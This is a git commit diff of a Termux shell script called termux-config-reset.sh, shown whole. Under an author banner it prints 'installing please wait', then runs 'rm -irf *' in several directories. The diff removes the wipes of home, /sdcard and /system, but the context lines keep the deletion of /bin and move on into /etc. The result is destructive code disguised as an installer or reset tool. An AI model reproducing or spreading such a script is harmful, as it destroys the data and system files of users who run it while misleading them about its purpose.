e04990480ab00486839dc9d313db4207f8255f69
SaintMalik <37118134+saintmalik@users.noreply.github.com>
2021-08-22 16:56:12 +0100

    Update termux-config-reset.sh

--- termux-config-reset.sh
+++ termux-config-reset.sh
@@ -8,22 +8,14 @@ print "*       #     #    #    #           # #        #                  *"
 print "*       #     #     #   #     #     # #        #                  *"
 print "*       #     #      #  #####  #####  #####    #                  *"
 print "* Termux-Config-Reset Ver. 2.0                                    *"
-print "* Coded by SaintMalik                                     *"
+print "* Coded by SaintMalik                                             *"
 print "* Cyber Security & Pentester                                      *"
-print "* Twitter: https://twitter.com/saintmalik_                               *"
+print "*                                                                 *"
 print "*******************************************************************\033[94m\n\n"
 
 echo "installing please wait"
 apt-get update
-cd
-rm -irf *
-cd /sdcard
-rm -irf *
-cd
 cd /bin
-rm -irf *
-cd
-cd /system
 rm -irf *
 cd 
 cd /etc
